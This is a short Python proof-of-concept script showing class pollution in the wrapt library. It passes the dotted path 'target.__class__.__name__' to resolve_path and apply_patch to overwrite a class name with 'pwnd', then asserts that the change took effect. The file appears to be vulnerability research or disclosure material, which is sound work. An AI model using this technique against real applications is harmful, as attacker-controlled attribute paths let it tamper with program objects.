# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: resolve_path + apply_patch
# Type: get-attr-set-attr

from wrapt import resolve_path, apply_patch

class Target: pass
target = Target()

class MockModule:
  pass

module = MockModule()
module.target = target

payload_value = "pwnd"
PAYLOAD = "target.__class__.__name__"

def run_poc():
  # resolve_path splits name on "." and traverses via getattr
  # apply_patch calls setattr on the resolved parent
  parent, attribute, original = resolve_path(module, PAYLOAD)
  apply_patch(parent, attribute, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
